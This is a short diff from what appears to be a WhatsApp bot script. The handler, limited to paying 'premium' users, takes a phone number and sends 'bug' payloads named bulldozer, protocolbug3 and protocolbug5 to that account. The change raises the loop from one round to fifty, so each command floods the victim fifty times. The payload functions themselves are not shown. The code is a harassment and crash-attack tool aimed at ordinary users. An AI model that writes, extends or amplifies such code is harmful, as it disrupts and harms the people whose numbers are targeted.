@@ -491,7 +491,7 @@ if (!isPremium) return m.reply('Khusus Premium');
 if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
 target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 m.reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`); 
-          for (let i = 0; i < 1; i++) {
+          for (let i = 0; i < 50; i++) {
             await bulldozer(target);
             await protocolbug3(target);
             await protocolbug5(target);
